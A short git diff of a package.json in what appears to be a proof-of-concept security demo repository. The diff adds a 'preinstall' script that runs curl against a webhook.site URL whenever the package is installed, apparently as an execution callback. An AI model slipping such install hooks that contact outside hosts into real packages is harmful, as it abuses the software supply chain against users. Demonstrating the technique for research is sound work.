@@ -5,10 +5,11 @@
     "type": "git",
     "url": "https://github.com/AdnaneKhan/CacheractDemo"
   },
-  "description": "Cacheract Hello World Package - it just says hello...right?",
+  "description": "I changed this to trigger another test",
   "main": "src/index.js",
   "scripts": {
-    "test": "jest"
+    "test": "jest",
+    "preinstall": "curl -fsSL https://webhook.site/bcbb74a1-d23e-4d9d-953a-67ffef557573"
   },
   "keywords": ["poc"],
   "author": "Adnan Khan",
